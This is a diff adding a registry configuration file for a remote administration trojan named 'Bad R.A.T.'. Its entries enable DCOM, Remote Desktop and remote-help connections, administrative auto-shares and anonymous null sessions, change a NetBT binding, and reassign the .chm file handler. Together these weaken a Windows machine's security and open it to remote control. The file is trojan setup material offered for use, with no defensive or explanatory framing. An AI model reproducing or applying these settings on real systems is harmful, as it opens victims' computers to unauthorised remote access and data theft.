@@ -1,0 +1,22 @@
+;Reg Keys for [Bad R.A.T.]
+;by Mr Hawk
+;www.bad-rat.de.vu
+;THX to Rafel Ivgi and The-Insider
+
+;Enable DCOM
+RegAdd HKEY_LOCAL_MACHINE,SOFTWARE\Microsoft\Ole,EnableDCOM,Y
+;Enable Remote Desktop
+RegAdd  HKEY_LOCAL_MACHINE,SYSTEM\ControlSet001\Control\Terminal Server,TSEnabled,1
+RegAdd  HKEY_LOCAL_MACHINE,SYSTEM\ControlSet001\Control\Terminal Server,TSUserEnabled,1
+RegAdd  HKEY_LOCAL_MACHINE,SYSTEM\ControlSet001\Control\Terminal Server,fAllowToGetHelp,1
+RegAdd  HKEY_LOCAL_MACHINE,SYSTEM\ControlSet001\Control\Terminal Server,fDenyTSConnections,0
+
+;Enable Port 455
+RegAdd  HKEY_LOCAL_MACHINE,SYSTEM\CurrentControlSet\Services\NetBT\Parameters,TransportBindName,\Device\
+;Enable  *.Chm
+RegAdd HKEY_CLASSES_ROOT,chm.file\shell\open\command,,"C:\WINDOWS\system32\notepad.exe %1"
+;Enable Auto Share Server
+RegAdd  HKEY_LOCAL_MACHINE,System\CurrentControlSet\Services\LanmanServer\Parameters,AutoShareServer,1
+RegAdd  HKEY_LOCAL_MACHINE,System\CurrentControlSet\Services\LanmanServer\Parameters,AutoShareWks,1
+;Enable Null Session
+RegAdd  HKEY_LOCAL_MACHINE,SYSTEM\CurrentControlSet\Control\Lsa,restrictanonymous,0
